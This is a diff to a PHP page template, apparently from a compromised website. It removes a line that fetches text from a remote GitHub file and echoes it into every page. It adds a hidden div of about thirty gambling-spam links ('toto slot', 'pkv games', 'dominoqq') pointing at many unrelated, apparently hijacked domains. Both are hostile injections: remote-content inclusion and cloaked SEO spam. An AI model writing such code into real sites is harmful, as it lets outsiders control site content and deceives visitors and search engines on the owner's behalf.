@@ -29,8 +29,38 @@ include($this['path']->path('layouts:template.config.php'));
 	<?php endif; ?>
 	
 	<div class="wrapper grid-block">
-		<p>test168</p>
-		<?php echo file_get_contents("https://raw.githubusercontent.com/rishan828-cr1/back/main/1.txt"); ?>
+		<div style="display:none">
+<a href="http://mobile.muvee.com/">toto slot</a>
+<a href="http://mobile.muvee.com/pokerqq/">poker qq</a>
+<a href="http://wap.muvee.com/">toto slot</a>
+<a href="http://wap.muvee.com/">gue toto slot</a>
+<a href="http://wap.muvee.com/pokerqq/">pokerqq</a>
+<a href="http://wap.muvee.com/poker-qq/">poker qq</a>
+<a href="http://output.rapyder.com/index.html">slot88</a>
+<a href="http://assets.iamrogue.com/index.html">slot pulsa</a>
+<a href="http://slice-watch.staging.slice.com/">pkv games</a>
+<a href="http://learn.landis.com/pkv-games/">pkv games</a>
+<a href="http://learn.landis.com/dominoqq/">dominoqq</a>
+<a href="http://learn.landis.com/bandarqq/">bandarqq</a>
+<a href="http://ftp.flowstate.fm/">pkv games</a>
+<a href="http://ftp.flowstate.fm/dominoqq/">dominoqq</a>
+<a href="http://ftp.flowstate.fm/bandarqq/">bandarqq</a>
+<a href="http://s3.westfield.com/dominoqq/index.html">qiu qiu</a>
+<a href="http://s3.westfield.com/index.html">pkv games</a>
+<a href="http://s3.westfield.com/bandarqq/index.html">bandarqq</a>
+<a href="https://www.sxccal.edu/dominoqq/">dominoqq</a>
+<a href="https://www.sxccal.edu/batara138/">batara138</a>
+<a href="https://www.sxccal.edu/wp-admin/pkv-games/">pkv</a>
+<a href="http://chopshop.vistarmedia.com/">pkv games</a>
+<a href="http://chopshop.vistarmedia.com/bo-slot/">bo slot</a>
+<a href="http://s3.workamajig.com/index.html">slot deposit 10 ribu</a>
+<a href="http://ftp.cools.com/index.html">bocoran slot jarwo</a>
+<a href="http://cdns.intermarkets.net/">pkv games</a>
+<a href="http://s3.workamajig.com/situs-slot-pulsa/index.html">situs slot pulsa</a>
+<a href="https://krcresearch.stpats.vic.edu.au/">https://krcresearch.stpats.vic.edu.au/</a>
+<a href="https://krcresearch.stpats.vic.edu.au/murnibet.html">murnibet login/</a>
+<a href="http://s3.democracyforamerica.com/index.html">hdpbet</a>
+</div>
 		<div id="toolbar" class="grid-block">
 
 				<?php if ($this['modules']->count('toolbar-l') || $this['config']->get('date')) : ?>
